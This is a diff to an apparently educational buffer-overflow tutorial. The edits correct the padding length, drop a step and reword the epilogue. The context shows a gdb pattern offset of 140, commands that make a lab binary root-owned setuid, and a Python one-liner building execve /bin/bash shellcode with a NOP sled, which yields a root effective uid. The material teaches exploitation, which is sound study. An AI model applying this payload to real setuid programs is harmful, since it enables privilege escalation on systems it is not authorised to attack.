@@ -414,7 +414,7 @@ EIP: 0x41416d41 ('AmAA')
 gdb-peda$ pattern offset 0x41416d41
 1094806849 found at offset: 140
 ```
-We see it's at position 140.  Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root regardless.  We then change to an alternative unprivileged user, and use the binary to get the position of the buffer.
+We see it's at position 140.  Now we have all the ingredients needed to exploit this binary.  Firstly, we make the binary an suid binary, so it will be executed as root.  We then use the binary to get the position of the buffer.
 ```bash
 ubuntu@ubuntu:/tmp$ sudo chown root:root ./test
 [sudo] password for ubuntu: 
@@ -428,7 +428,9 @@ In our payload we then place the following shellcode: [http://shell-storm.org/sh
 python -c "from struct import pack; print '\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80'.ljust(140,'\x90') +  pack('<L', 0xffffcfd0)"  > /tmp/var
 ```
 
-You'll notice here I've used ljust on the shellcode.  This just pads the string to the determined length of 128 and pads it with NOP instructions, so it makes the process of creating a nopsled slightly easier.  Run the binary, inputting the payload, we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) does, indicating we now have root privileges.
+You'll notice here I've used ljust on the shellcode.  This just pads the string to the determined length of 140 and pads it with NOP instructions, so it makes the process of creating a nopsled slightly easier.  For example, if we were to replace the shellcode, no other adjustments would be necessary.  
+
+We run the binary, inputting the payload, and we are returned a root shell.  The uid won't change but the [effective-uid](https://stackoverflow.com/questions/32455684/difference-between-real-user-id-effective-user-id-and-saved-user-id) or the euid does, meaning we now have root privileges.
 
 ```bash
 ubuntu@ubuntu:/tmp$ (cat /tmp/var; cat) | ./test
@@ -440,7 +442,7 @@ uid=1000(ubuntu) gid=1000(ubuntu) euid=0(root) groups=1000(ubuntu),4(adm),24(cdr
 
 Epilogue
 --------
-We've gone from overwriting basic stack variables to controlling complete execution of the program.  Next I'll be showing you how to bypass the very basic memory protections.  Have fun exploiting, and if you have any questions, do drop me a message.  For now I've included all references and other literature that might be of interest.  
+We've gone from overwriting basic stack variables to controlling complete execution of the program.  Next I'll be showing you how to use GDB to determine the location to jump to, and how to bypass the very basic memory protections.  Have fun exploiting, and if you have any questions, do drop me a message.  For now I've included all references and other literature that might be of interest.  
 
 Happy Hacking!
 
